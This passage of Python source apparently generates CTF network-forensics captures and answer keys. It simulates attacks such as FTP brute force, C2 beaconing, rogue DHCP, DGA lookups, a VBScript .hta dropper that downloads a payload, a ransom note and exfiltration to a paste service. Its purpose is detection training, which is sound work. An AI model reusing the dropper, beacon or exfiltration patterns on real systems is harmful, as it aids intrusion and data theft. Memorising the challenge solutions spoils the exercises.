                  "<tr><td>svc_sql</td><td>service</td><td>2024-06-25</td></tr></table>"
                  "</body></html>").encode()
    resp = _http_response(rng, host, path="/admin/", ctype="text/html; charset=UTF-8",
                          body=admin_body)
    pkts = tcp_session(net, client, server, 80, [("c2s", req), ("s2c", resp)], rng, clock, cfg)
    res = HideResult(packets=pkts)
    for p in pkts:
        if p.haslayer(Raw) and b"Authorization: Basic" in bytes(p[Raw].load):
            res.mark(p, "HTTP Basic Authorization header (base64 user:flag)")
            break
    res.solution = [
        f"Spot the HTTP Basic auth (TCP/80) from {client.ip} to host {host}.",
        "Grab the 'Authorization: Basic <token>' header and base64-decode it.",
        "The part after the ':' is the password" +
        ("" if scheme == "none" else f", then {describe_decode(scheme, xor_key)}") + ".",
    ]
    return res


def scenario_brute_force(flag: bytes, rng, clock, cfg, scheme, xor_key,
                         net: Network) -> HideResult:
    """An FTP password brute-force: many failed logins, then one success. The flag
    is the password on the one attempt that worked."""
    secret = flag.decode() if scheme == "none" else encode_payload(flag, scheme, xor_key).decode()
    client = rng.choice(net.clients)
    server = rng.choice(list(net.servers.values()))
    user = rng.choice(["administrator", "svc_sql", "backup"])
    wrong = ["Password1", "letmein", "Summer2023", "Welcome1", "P@ssw0rd",
             "admin123", "qwerty", "changeme", "Spring2024!"]
    attempts = rng.sample(wrong, rng.randint(6, 9)) + [secret]  # success is last
    exch = [("s2c", b"220 ProFTPD Server ready.\r\n")]
    for i, pw in enumerate(attempts):
        exch.append(("c2s", f"USER {user}\r\n".encode()))
        exch.append(("s2c", b"331 Password required.\r\n"))
        exch.append(("c2s", f"PASS {pw}\r\n".encode()))
        exch.append(("s2c", b"230 User logged in.\r\n" if pw == secret
                     else b"530 Login incorrect.\r\n"))
    pkts = tcp_session(net, client, server, 21, exch, rng, clock, cfg)
    res = HideResult(packets=pkts)
    # mark the successful PASS (the one followed by 230)
    for i, p in enumerate(pkts):
        if p.haslayer(Raw) and bytes(p[Raw].load).startswith(f"PASS {secret}".encode()):
            res.mark(p, "Successful PASS after many failures (flag = cracked password)")
            break
    tail = "read the password directly" if scheme == "none" else \
        f"take the password and {describe_decode(scheme, xor_key)}"
    res.solution = [
        f"Spot the brute force: {len(attempts)-1} failed FTP logins (530) from "
        f"{client.ip} to {server.ip}, then one success (230).",
        f"The PASS on the successful attempt (account '{user}') is the secret.",
        f"To get the flag, {tail}.",
    ]
    return res


def scenario_c2_beacon(flag: bytes, rng, clock, cfg, scheme, xor_key,
                       net: Network) -> HideResult:
    """C2 beaconing: regular fixed-interval HTTP callbacks to one external host.
    The flag rides (encoded) in a beacon's POST body."""
    enc = encode_payload(flag, scheme if scheme != "none" else "base64", xor_key).decode()
    client = rng.choice(net.clients)
    c2 = rng.choice([s for n, s in net.servers.items() if not n.endswith(".local")]
                    or list(net.servers.values()))
    interval = rng.choice([5.0, 10.0, 15.0])      # fixed beacon interval
    n_beacons = rng.randint(5, 8)
    flag_beacon = rng.randint(1, n_beacons - 1)
    uri = "/api/v1/telemetry"
    res = HideResult()
    start = clock[0]
    beacon_ua = rng.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    ])
    for i in range(n_beacons):
        body = (f"id=7f3a&seq={i}&data=" +
                (enc if i == flag_beacon else base64.b64encode(
                    bytes(rng.getrandbits(8) for _ in range(12))).decode())).encode()
        req = (f"POST {uri} HTTP/1.1\r\nHost: {c2.name}\r\n"
               f"User-Agent: {beacon_ua}\r\n"
               f"Accept: */*\r\nAccept-Encoding: gzip, deflate\r\n"
               f"Content-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n").encode() + body
        # realistic-looking C2 tasking reply: full headers + an encoded 'task' blob
        task = base64.b64encode(bytes(rng.getrandbits(8)
                                      for _ in range(rng.randint(16, 64)))).decode()
        rbody = ('{"status":"ok","interval":%d,"jitter":%d,"task":"%s"}'
                 % (int(interval), rng.randint(5, 20), task)).encode()
        resp = _http_response(rng, c2.name, path=uri, ctype="application/json",
                              body=rbody, set_cookie=False)
        # place each beacon at a fixed interval
        clock[0] = start + i * interval
        session = tcp_session(net, client, c2, 80, [("c2s", req), ("s2c", resp)],
                              rng, clock, cfg)
        res.packets += session
        for p in session:
            if p.haslayer(Raw) and b"POST " in bytes(p[Raw].load):
                if i == flag_beacon:
                    res.mark(p, f"C2 beacon #{i} whose POST body 'data=' carries the flag")
                else:
                    res.mark(p, f"C2 beacon #{i} (decoy callback)")
                break
    actual = scheme if scheme != "none" else "base64"
    res.solution = [
        f"Spot the C2 beaconing: {client.ip} POSTs to {c2.name} ({c2.ip}) every "
        f"~{interval:g}s - a suspiciously regular interval.",
        f"Inspect the beacon bodies; the 'data=' field of beacon #{flag_beacon} differs "
        f"from the random others.",
        f"Take that data value and {describe_decode(actual, xor_key)}.",
    ]
    return res
# ===========================================================================
# Wave-2 scenarios
# ===========================================================================
def scenario_rogue_dhcp(flag, rng, clock, cfg, scheme, xor_key, net):
    """A rogue DHCP server races the legit one: it answers a client's DISCOVER
    with its own OFFER advertising the ATTACKER as the gateway/DNS. The encoded
    flag rides in the rogue OFFER's BOOTP boot-file field."""
    enc = (flag.decode() if scheme == "none"
           else encode_payload(flag, scheme, xor_key).decode())
    client = rng.choice(net.clients)
    rogue = rng.choice([c for c in net.clients if c.ip != client.ip])  # attacker host
    gw = net.gateway
    chaddr = _mac_bytes(client.mac) + b"\x00" * 10
    xid = rng.randint(1, 2**32 - 1)
    res = HideResult()

    def _boot(msgtype, src_ip, dst_ip, src_mac, dst_mac, yiaddr="0.0.0.0", opts=None):
        o = [("message-type", msgtype)] + (opts or []) + ["end"]
        return (Ether(src=src_mac, dst=dst_mac) /
                IP(src=src_ip, dst=dst_ip) /
                UDP(sport=67 if msgtype in ("offer", "ack") else 68,
                    dport=68 if msgtype in ("offer", "ack") else 67) /
                BOOTP(chaddr=chaddr, xid=xid, yiaddr=yiaddr, ciaddr="0.0.0.0") /
                DHCP(options=o))

    disc = _boot("discover", "0.0.0.0", "255.255.255.255",
                 client.mac, "ff:ff:ff:ff:ff:ff")
    legit = _boot("offer", gw.ip, "255.255.255.255", gw.mac, client.mac,
                  yiaddr=client.ip,
                  opts=[("server_id", gw.ip), ("router", gw.ip),
                        ("lease_time", 86400), ("subnet_mask", "255.255.255.0")])
    rogue_off = _boot("offer", rogue.ip, "255.255.255.255", rogue.mac, client.mac,
                      yiaddr=client.ip,
                      opts=[("server_id", rogue.ip), ("router", rogue.ip),
                            ("name_server", rogue.ip), ("lease_time", 600),
                            ("subnet_mask", "255.255.255.0")])
    rogue_off[BOOTP].file = enc.encode()   # flag tucked in the boot-file field
    for p in (disc, legit, rogue_off):
        clock[0] += abs(rng.gauss(0.03, 0.01)) + 0.002
        p.time = clock[0]
        res.packets.append(p)
    res.mark(rogue_off, "Rogue DHCP OFFER (attacker as gateway/DNS); flag in boot-file")
    tail = "read it directly" if scheme == "none" else f"{describe_decode(scheme, xor_key)}"
    res.solution = [
        f"Two DHCP OFFERs answer the same DISCOVER (xid {xid:#x}): one from the real "
        f"gateway {gw.ip}, one from {rogue.ip} - a rogue DHCP server.",
        f"The rogue OFFER advertises {rogue.ip} as router AND DNS, and carries data "
        f"in the BOOTP boot-file (sname/file) field.",
        f"Take the boot-file value and {tail}.",
    ]
    return res


def scenario_ssdp_upnp(flag, rng, clock, cfg, scheme, xor_key, net):
    """SSDP/UPnP discovery abuse: an M-SEARCH to 239.255.255.250:1900 and NOTIFY
    answers. One malicious NOTIFY's LOCATION URL carries the encoded flag in a
    query parameter pointing at a rogue device description."""
    enc = (encode_payload(flag, "base64", xor_key).decode() if scheme == "none"
           else encode_payload(flag, scheme, xor_key).decode())
    client = rng.choice(net.clients)
    rogue = rng.choice([c for c in net.clients if c.ip != client.ip])
    MCAST = "239.255.255.250"
    res = HideResult()

    msearch = ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
               'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n').encode()
    mp = (Ether(src=client.mac, dst="01:00:5e:7f:ff:fa") /
          IP(src=client.ip, dst=MCAST, ttl=2) /
          UDP(sport=rng.randint(1025, 65535), dport=1900) / Raw(load=msearch))
    clock[0] += 0.005; mp.time = clock[0]; res.packets.append(mp)

    for i in range(rng.randint(2, 4)):
        loc = f"http://{rogue.ip}:1900/desc.xml"
        usn = f"uuid:{rng.randint(0,2**32):08x}::upnp:rootdevice"
        if i == 0:
            loc = f"http://{rogue.ip}:1900/device.xml?sid={enc}"  # flag carrier
        notify = (f"NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
                  f"CACHE-CONTROL: max-age=1800\r\nLOCATION: {loc}\r\n"
                  f"NT: upnp:rootdevice\r\nNTS: ssdp:alive\r\n"
                  f"SERVER: Linux/3.14 UPnP/1.0 MiniUPnPd/2.1\r\nUSN: {usn}\r\n\r\n").encode()
        np_ = (Ether(src=rogue.mac, dst="01:00:5e:7f:ff:fa") /
               IP(src=rogue.ip, dst=MCAST, ttl=2) /
               UDP(sport=1900, dport=1900) / Raw(load=notify))
        clock[0] += abs(rng.gauss(0.04, 0.02)) + 0.003
        np_.time = clock[0]; res.packets.append(np_)
        if i == 0:
            res.mark(np_, "Malicious SSDP NOTIFY; flag in the LOCATION URL 'sid' param")
    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
    res.solution = [
        f"Spot SSDP/UPnP traffic to {MCAST}:1900 - an M-SEARCH from {client.ip} and "
        f"NOTIFY answers from {rogue.ip}.",
        "One NOTIFY's LOCATION URL has an extra 'sid=' query parameter (a rogue device "
        "description) - that value is the encoded flag.",
        f"Take the sid value and {tail}.",
    ]
    return res


def scenario_doh_beacon(flag, rng, clock, cfg, scheme, xor_key, net):
    """Malware beacons over DNS-over-HTTPS to a public resolver at fixed intervals
    (TLS/443). The bodies are encrypted, but the TLS SNI is in the clear: one
    beacon's SNI has an extra data label that is the encoded flag."""
    enc = encode_payload(flag, dns_safe_scheme(scheme), xor_key).decode().lower()
    client = rng.choice(net.clients)
    provider = Host("104.16.249.249", net.gateway.mac, "server", "cloudflare-dns.com")
    interval = rng.choice([30.0, 60.0])
    n = rng.randint(4, 6)
    flag_idx = rng.randint(1, n - 1)
    res = HideResult()
    start = clock[0]
    for i in range(n):
        sni = "cloudflare-dns.com" if i != flag_idx else f"{enc}.cloudflare-dns.com"
        ch = _tls_client_hello(sni, rng)
        sh = _tls_record(0x16, bytes(rng.getrandbits(8) for _ in range(rng.randint(600, 1200))))
        clock[0] = start + i * interval
        session = tcp_session(net, client, provider, 443,
                              [("c2s", ch), ("s2c", sh),
                               ("c2s", _tls_record(0x17, bytes(rng.getrandbits(8) for _ in range(rng.randint(80, 200))))),
                               ("s2c", _tls_record(0x17, bytes(rng.getrandbits(8) for _ in range(rng.randint(80, 300)))))],
                              rng, clock, cfg)
        res.packets += session
        for p in session:
            if p.haslayer(Raw) and sni.encode() in bytes(p[Raw].load):
                res.mark(p, f"DoH beacon #{i} TLS ClientHello"
                            + (" (SNI carries the flag label)" if i == flag_idx else " (decoy)"))
                break
    res.solution = [
        f"Spot the regular TLS beaconing (443) from {client.ip} to the DoH resolver "
        f"{provider.ip} every ~{interval:g}s - encrypted DNS-over-HTTPS.",
        "The payloads are encrypted, but the TLS SNI (server_name) is in the clear; "
        "one ClientHello has an extra sub-label prepended to cloudflare-dns.com.",
        f"Take that label and {describe_decode(dns_safe_scheme(scheme), xor_key)} "
        f"(it is stored lowercase).",
    ]
    return res


def scenario_dga_beacon(flag, rng, clock, cfg, scheme, xor_key, net):
    """Malware resolves a burst of algorithmically-generated domains (DGA) hunting
    for its live C2. The queries look random; one query's label is the encoded
    flag rather than DGA gibberish."""
    enc = encode_payload(flag, dns_safe_scheme(scheme), xor_key).decode().lower()
    client = rng.choice(net.clients)
    tlds = [".com", ".net", ".biz", ".info", ".xyz"]
    res = HideResult()
    n = rng.randint(10, 16)
    flag_idx = rng.randint(2, n - 2)
    for i in range(n):
        if i == flag_idx:
            qname = f"{enc}{rng.choice(tlds)}"
        else:
            label = "".join(rng.choice("abcdefghijklmnopqrstuvwxyz0123456789")
                            for _ in range(rng.randint(12, 20)))
            qname = f"{label}{rng.choice(tlds)}"
        q = (_eth(net, client.ip, net.dns.ip) / IP(src=client.ip, dst=net.dns.ip) /
             UDP(sport=rng.randint(1025, 65535), dport=53) /
             DNS(rd=1, id=rng.randint(0, 65535), qd=DNSQR(qname=qname)))
        clock[0] += abs(rng.gauss(0.08, 0.03)) + 0.002
        q.time = clock[0]
        res.packets.append(q)
        if rng.random() < 0.6:
            r = (_eth(net, net.dns.ip, client.ip) / IP(src=net.dns.ip, dst=client.ip) /
                 UDP(sport=53, dport=q[UDP].sport) /
                 DNS(id=q[DNS].id, qr=1, ra=1, rcode=3, qd=DNSQR(qname=qname)))
            clock[0] += abs(rng.gauss(0.02, 0.01)) + 0.001
            r.time = clock[0]
            res.packets.append(r)
        if i == flag_idx:
            res.mark(q, "DGA query whose label is the encoded flag (not gibberish)")
    res.solution = [
        f"Spot the DGA beaconing: {client.ip} fires {n} DNS lookups to long random "
        f"domains across many TLDs, mostly NXDOMAIN - classic domain-generation.",
        "One query's label isn't random gibberish; it is the encoded flag.",
        f"Take that label and {describe_decode(dns_safe_scheme(scheme), xor_key)} "
        f"(stored lowercase).",
    ]
    return res


def scenario_malware_chain(flag, rng, clock, cfg, scheme, xor_key, net):
    """A drive-by chain: a lure URL 302-redirects through a couple of hops to a
    dropper script, which then pulls a binary payload. The dropper script embeds
    the encoded flag as its C2 key (readable in the HTTP stream)."""
    enc = (encode_payload(flag, "base64", xor_key).decode() if scheme == "none"
           else encode_payload(flag, scheme, xor_key).decode())
    client = rng.choice(net.clients)
    servers = list(net.servers.values())
    lure, hop, drop = (rng.sample(servers, 3) if len(servers) >= 3
                       else [rng.choice(servers) for _ in range(3)])
    ua = rng.choice(_USER_AGENTS)
    res = HideResult()

    req1 = (f"GET /invoice/INV-4471.doc HTTP/1.1\r\nHost: {lure.name}\r\n"
            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
    resp1 = _http_response(rng, lure.name, status=302,
                           location=f"http://{hop.name}/cdn/redir?u=8821", body=b"")
    res.packets += tcp_session(net, client, lure, 80, [("c2s", req1), ("s2c", resp1)], rng, clock, cfg)
    req2 = (f"GET /cdn/redir?u=8821 HTTP/1.1\r\nHost: {hop.name}\r\n"
            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
    resp2 = _http_response(rng, hop.name, status=302,
                           location=f"http://{drop.name}/get/update.hta", body=b"")
    res.packets += tcp_session(net, client, hop, 80, [("c2s", req2), ("s2c", resp2)], rng, clock, cfg)
    dropper = (f"<html><head><script language=\"VBScript\">\n"
               f"' auto-update component\nDim c2key, payloadUrl\n"
               f"c2key = \"{enc}\"\n"
               f"payloadUrl = \"http://{drop.name}/bin/update.bin\"\n"
               f"Set x = CreateObject(\"MSXML2.XMLHTTP\")\n"
               f"x.open \"GET\", payloadUrl, False\nx.send\n"
               f"</script></head><body>Updating...</body></html>").encode()
    req3 = (f"GET /get/update.hta HTTP/1.1\r\nHost: {drop.name}\r\n"
            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
    resp3 = _http_response(rng, drop.name, path="/get/update.hta",
                           ctype="application/hta", body=dropper, set_cookie=False, gzip_ok=False)
    sess3 = tcp_session(net, client, drop, 80, [("c2s", req3), ("s2c", resp3)], rng, clock, cfg)
    res.packets += sess3
    for p in sess3:
        if p.haslayer(Raw) and b"c2key" in bytes(p[Raw].load):
            res.mark(p, "Dropper script (.hta) embedding the flag as its c2key")
            break
    payload = b"MZ" + bytes(rng.getrandbits(8) for _ in range(rng.randint(400, 900)))
    req4 = (f"GET /bin/update.bin HTTP/1.1\r\nHost: {drop.name}\r\n"
            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
    resp4 = _http_response(rng, drop.name, path="/bin/update.bin",
                           ctype="application/octet-stream", body=payload, set_cookie=False)
    res.packets += tcp_session(net, client, drop, 80, [("c2s", req4), ("s2c", resp4)], rng, clock, cfg)
    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
    res.solution = [
        f"Follow the redirect chain from {client.ip}: a lure on {lure.name} 302s to "
        f"{hop.name}, which 302s to {drop.name} serving an .hta dropper, which pulls "
        f"an MZ binary (/bin/update.bin).",
        "Open the dropper (.hta) stream; it sets c2key = \"<encoded flag>\".",
        f"Take the c2key value and {tail}.",
    ]
    return res


def scenario_ransomware_note(flag, rng, clock, cfg, scheme, xor_key, net):
    """Post-encryption, the host fetches/drops a ransom note. The note text is in
    the clear and contains a 'Personal ID' that is the encoded flag."""
    enc = (encode_payload(flag, "base64", xor_key).decode() if scheme == "none"
           else encode_payload(flag, scheme, xor_key).decode())
    client = rng.choice(net.clients)
    server = rng.choice([s for s in net.servers.values()])
    ua = rng.choice(_USER_AGENTS)
    res = HideResult()
    note = (b"!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\r\n\r\n"
            b"All your documents, photos and databases were encrypted with AES-256.\r\n"
            b"To recover them you must purchase the decryptor in Bitcoin.\r\n\r\n"
            b"Personal ID: " + enc.encode() + b"\r\n"
            b"Contact: recovery_help@protonmail.com within 72 hours.\r\n"
            b"Tor portal: http://decrypt" + ("%08x" % rng.getrandbits(32)).encode()
            + b".onion/\r\n")
    req = (f"GET /READ_ME_DECRYPT.txt HTTP/1.1\r\nHost: {server.name}\r\n"
           f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
    resp = _http_response(rng, server.name, path="/READ_ME_DECRYPT.txt",
                          ctype="text/plain", body=note, set_cookie=False, gzip_ok=False)
    sess = tcp_session(net, client, server, 80, [("c2s", req), ("s2c", resp)], rng, clock, cfg)
    res.packets += sess
    for p in sess:
        if p.haslayer(Raw) and b"Personal ID:" in bytes(p[Raw].load):
            res.mark(p, "Ransom note (READ_ME_DECRYPT.txt); flag is the 'Personal ID'")
            break
    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
    res.solution = [
        f"Spot the ransom note fetched by {client.ip} (READ_ME_DECRYPT.txt) - text "
        f"mentioning AES-256, Bitcoin, and a .onion portal.",
        "The note's 'Personal ID:' field is the encoded flag.",
        f"Take the Personal ID and {tail}.",
    ]
    return res

def scenario_pastebin_exfil(flag, rng, clock, cfg, scheme, xor_key, net):
    """Data is exfiltrated to a paste service across several POSTs - a 'dead drop'.
    The encoded flag is split into indexed chunks; reassemble them in order."""
    enc = (encode_payload(flag, "base64", xor_key) if scheme == "none"
           else encode_payload(flag, scheme, xor_key))
    client = rng.choice(net.clients)
    paste = Host("104.20.3.235", net.gateway.mac, "server", "pastebin.com")
    ua = rng.choice(_USER_AGENTS)
    res = HideResult()
    nchunks = rng.randint(3, 5)
    size = (len(enc) + nchunks - 1) // nchunks
    chunks = [enc[i:i + size] for i in range(0, len(enc), size)]
    for idx, ch in enumerate(chunks):
        body = (f"api_dev_key=8f3c2&api_option=paste&paste_private=1&"
                f"paste_idx={idx}&paste_data={ch.decode()}").encode()
        req = (f"POST /api/api_post.php HTTP/1.1\r\nHost: {paste.name}\r\n"
               f"User-Agent: {ua}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {len(body)}\r\n\r\n").encode() + body
        resp = _http_response(rng, paste.name, path="/api/api_post.php",
                              ctype="text/plain",
                              body=f"https://pastebin.com/{rng.getrandbits(32):08x}".encode(),
                              set_cookie=False, gzip_ok=False)
        sess = tcp_session(net, client, paste, 80, [("c2s", req), ("s2c", resp)], rng, clock, cfg)
        res.packets += sess
        for p in sess:
            if p.haslayer(Raw) and b"paste_data=" in bytes(p[Raw].load):
                res.mark(p, f"Paste dead-drop POST chunk #{idx}")
                break
        clock[0] += abs(rng.gauss(0.3, 0.1)) + 0.05
    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
    res.solution = [
        f"Spot the dead-drop exfil: {client.ip} makes {len(chunks)} POSTs to the paste "
        f"service {paste.name} ({paste.ip}).",
        "Each POST body has paste_idx=N and paste_data=<chunk>; sort by idx and "
        "concatenate the chunks.",
        f"Then {tail} to recover the flag.",
    ]
    return res

# --- scenario registry -----------------------------------------------------
# TO ADD AN ATTACK SCENARIO:
#   1. write scenario_<name>(flag, rng, clock, cfg, scheme, xor_key, net)
#      -> HideResult   (build the attack traffic; res.mark() the carrier
#      packet(s); fill res.solution with the human solve path)
#   2. register it here:  "<name>": scenario_<name>
#   3. add a self_check branch for "<name>" so generation is verified
#   4. add "<name>" to the --scenario choices in main() AND to the
#      interactive Step-2 menu in interactive_config()
# These are DETECTION FIXTURES: any crypto/credential material is synthetic.
_SCENARIOS = {
    "kerberoast": scenario_kerberoast,
    "ftp-creds": scenario_ftp_creds,
    "telnet-creds": scenario_telnet_creds,
    "http-basic": scenario_http_basic,
    "arp-spoof": scenario_arp_spoof,
    "port-scan": scenario_port_scan,
    "brute-force": scenario_brute_force,
    "c2-beacon": scenario_c2_beacon,
    "rogue-dhcp": scenario_rogue_dhcp,
    "ssdp-upnp": scenario_ssdp_upnp,
    "doh-beacon": scenario_doh_beacon,
    "dga-beacon": scenario_dga_beacon,
    "malware-chain": scenario_malware_chain,
    "ransomware-note": scenario_ransomware_note,
    "pastebin-exfil": scenario_pastebin_exfil,
}


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

def build_challenge(args, progress=None) -> tuple[list, list[str], "Network"]:
    rng = random.Random(args.seed)
    cfg = NoiseConfig(subnet=args.subnet, seed=args.seed, jitter=args.jitter,
                      normalize=args.normalize, n_clients=args.clients)
    clock = [cfg.start_time]

    net = build_network(cfg, rng)

    flag_text = format_flag(args.wrapper, args.flag)
    flag_bytes = flag_text.encode()
    xor_key = args.xor.encode() if args.xor else None

    all_pkts = []
    # noise (counts are SESSIONS; each expands to several packets)
    for proto, n in (("arp", args.arp), ("dhcp", args.dhcp),
                     ("tcp", args.tcp), ("udp", args.udp), ("dns", args.dns),
                     ("icmp", args.icmp), ("http", args.http), ("https", args.https)):
        if n > 0:
            all_pkts += make_noise(proto, n, cfg, rng, clock, net, progress=progress)

    # decoys
    if args.decoys > 0:
        all_pkts += make_decoys(args.wrapper, args.decoys, cfg, rng, clock, net,
                                        getattr(args, "decoy_theme", "spongebob"),
                                        getattr(args, "decoy_words", None))

    # hidden flag: a scenario takes precedence over a plain hide method
    if args.scenario != "none":
        hr = _SCENARIOS[args.scenario](flag_bytes, rng, clock, cfg,
                                       args.encode, xor_key, net)
    elif args.method == "dns":
        hr = hide_dns_exfil(flag_bytes, cfg, rng, args.encode, xor_key, clock, net)
    elif args.method == "split-tcp":
        hr = hide_split_reassembly(flag_bytes, "tcp", cfg, rng, args.encode, xor_key, clock, net)
    elif args.method == "split-icmp":
        hr = hide_split_reassembly(flag_bytes, "icmp", cfg, rng, args.encode, xor_key, clock, net)
    elif args.method == "http":
        hr = hide_http_stream(flag_bytes, cfg, rng, args.encode, xor_key, clock, net)
    else:
        raise ValueError(f"unknown method: {args.method}")
    all_pkts += hr.packets

    # Interleave the carrier into the capture timeline. Carrier packets were
    # generated after the noise, so their timestamps are all latest; shift the
    # whole (internally-ordered) carrier burst to a random point within the
    # noise time span so it doesn't conspicuously sit at the very end.
    carrier = hr.packets
    carrier_ids = {id(p) for p in carrier}
    noise_pkts = [p for p in all_pkts if id(p) not in carrier_ids]
    if noise_pkts and carrier:
        t0 = min(float(p.time) for p in noise_pkts)
        t1 = max(float(p.time) for p in noise_pkts)
        cmin = min(float(p.time) for p in carrier)
        cmax = max(float(p.time) for p in carrier)
        span = cmax - cmin
        offset = rng.uniform(t0, max(t0, t1 - span))
        shift = offset - cmin
        for p in carrier:
            p.time = float(p.time) + shift

    # sort everything by time so carrier packets interleave with noise
    all_pkts.sort(key=lambda p: float(p.time))

    # normalize: re-space timestamps evenly for a tidy, uniform capture
    if cfg.normalize and all_pkts:
        gap = max(cfg.jitter, 0.01)
        t = cfg.start_time
        for p in all_pkts:
            t += gap
            p.time = t

    # resolve each tagged carrier packet to its final 1-based frame number
    frame_of = {id(p): i + 1 for i, p in enumerate(all_pkts)}
    located = [{"frame": frame_of.get(id(m["pkt"])), "desc": m["desc"]}
               for m in hr.markers]
    located = [m for m in located if m["frame"]]
    located.sort(key=lambda m: m["frame"])

    return all_pkts, hr.solution, net, located

# Player-facing incident briefings: the "why you're looking" context that turns a
# raw pcap into a challenge. Keyed by challenge name (scenario or hide-method).
# Deliberately NON-spoiler - they set the scene without naming the exact carrier.
# TO ADD ONE: add "<name>": "<briefing text>" for any new scenario/method.
_BRIEFINGS = {
    # hide methods
    "dns": "A workstation on the network is suspected of quietly tunneling data "
           "out over DNS. Pull the capture from that host and recover what was "
           "smuggled out - the exfiltrated data encodes the flag.",
    "split-tcp": "An analyst flagged some odd traffic where one message looked "
                 "deliberately broken into pieces across several packets. "
                 "Reassemble the pieces in the right order to recover the flag.",
    "split-icmp": "Ping traffic on this segment looks heavier than it should. "
                  "Someone hid a message inside the echo payloads; collect and "
                  "reassemble it to recover the flag.",
    "http": "A user's web session is under review after a DLP alert. Something "
            "was tucked into the HTTP traffic - follow the stream to recover the flag.",
    # scenarios
    "kerberoast": "Your SIEM fired on suspicious Kerberos activity against the "
                  "domain controller. Investigate the capture, identify what the "
                  "attacker was harvesting, and recover the flag from the anomaly.",
    "ftp-creds": "A legacy FTP server is still running plaintext auth and security "
                 "wants it gone. Prove the risk: find the credentials on the wire - "
                 "the password is the flag.",
    "telnet-creds": "An old device is still reachable over Telnet. Show why that's "
                    "dangerous by recovering the login sent in the clear - the "
                    "password is the flag.",
    "http-basic": "An internal admin panel uses HTTP Basic auth over cleartext. "
                  "Recover the credentials from the capture - the password is the flag.",
    "arp-spoof": "Users report intermittent connectivity and possible interception. "
                 "You suspect a man-in-the-middle on the LAN. Find the attack in the "
                 "capture and recover the flag hidden in the malicious frames.",
    "port-scan": "An IDS alert suggests one host was scanning another. Confirm the "
                 "scan, find the service that actually answered, and recover the flag "
                 "from what it returned.",
    "brute-force": "Authentication logs show a spike of failed logins against a "
                   "service. Find where the attacker finally succeeded - the "
                   "cracked password is the flag.",
    "c2-beacon": "A host is suspected of being infected and calling home. Find the "
                 "regular command-and-control callbacks in the capture and recover "
                 "the flag carried in one of the beacons.",
    "rogue-dhcp": "Clients are getting a suspicious default gateway. You suspect a "
                  "rogue DHCP server on the LAN. Find it in the capture and recover "
                  "the flag it planted.",
    "ssdp-upnp": "Odd UPnP/SSDP discovery traffic appeared on the network. Investigate "
                 "the device announcements and recover the flag hidden in a malicious "
                 "advertisement.",
    "doh-beacon": "A host is beaconing to an encrypted-DNS resolver at suspiciously "
                  "regular intervals. The payloads are encrypted, but not everything "
                  "is - inspect the traffic and recover the flag.",
    "dga-beacon": "Threat intel flagged malware that finds its C2 via generated "
                  "domains. Spot the domain-generation activity in the capture and "
                  "recover the flag hidden among the lookups.",
    "malware-chain": "A user clicked a link and something downloaded. Trace the web "
                     "activity from that host through to what was pulled down, and "
                     "recover the flag left in the delivery chain.",
    "ransomware-note": "A machine was hit by ransomware. Triage the capture, find "
                       "the attacker's message to the victim, and recover the flag "
                       "embedded in it.",
    "pastebin-exfil": "DLP suspects data was posted to an external paste service. "
                      "Find the uploads in the capture, piece the data back together, "
                      "and recover the flag.",
}
_BRIEFING_FALLBACK = ("You've been handed a network capture and told a flag is "
                      "hidden inside it. Investigate the traffic, identify what "
                      "doesn't belong, and recover the flag.")


def challenge_briefing(args) -> str:
    return _BRIEFINGS.get(challenge_name(args), _BRIEFING_FALLBACK)

def write_answer_key(path: str, args, solution: list[str], n_pkts: int,
                     located: list | None = None):
    flag_text = format_flag(args.wrapper, args.flag)
    challenge = challenge_name(args)
    eff, note = effective_encoding(args)
    enc_line = f"Encoding:       {eff}" + (f" + XOR('{args.xor}')" if args.xor else "")
    if note:
        enc_line += f"   [{note}]"
    lines = [
        "CTF CHALLENGE - ANSWER KEY",
        "=" * 48,
        f"Flag:           {flag_text}",
        f"Challenge:      {challenge}",
        enc_line,
        f"Seed:           {args.seed}",
        f"Total packets:  {n_pkts}",
        "",
        "PLAYER BRIEFING (safe to share - sets the scene, no spoilers):",
    ]
    import textwrap
    for line in textwrap.wrap(challenge_briefing(args), 72):
        lines.append("  " + line)
    lines += ["", "=" * 48, "SPOILERS BELOW", "=" * 48, "",
              "INTENDED SOLVE PATH:"]
    lines += [f"  {i}. {step}" for i, step in enumerate(solution, 1)]
    lines += ["", "CYBERCHEF RECIPE (gchq.github.io/CyberChef) - drag these in order:"]
    lines += [f"  {i}. {step}" for i, step in enumerate(cyberchef_recipe(args), 1)]
    if located:
        lines += ["", "FLAG CARRIER PACKETS (1-based frame numbers in the pcap):"]
        lines += [f"  frame {m['frame']:>5}  -  {m['desc']}" for m in located]
        lines += ["",
                  "  Verify in Wireshark: Ctrl-G (Go to packet) and enter the frame "
                  "number,",
                  "  or apply display filter  frame.number == <n>"]
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")


def force_ext(path: str, ext: str) -> str:
    """Force a filename to end in `ext` (e.g. '.pcap'). Replaces any other
    extension so the user can just type a name."""
    import os
    root, cur = os.path.splitext(path)
    if cur.lower() == ext.lower():
        return path
    # if they typed something like 'round1.cap' or 'round1', normalize to ext
    return (root if cur else path) + ext


def self_check(pkts, args) -> bool:
    """Re-solve the generated capture to confirm the flag is recoverable.
    Returns True if the intended flag is found by following the solve path."""
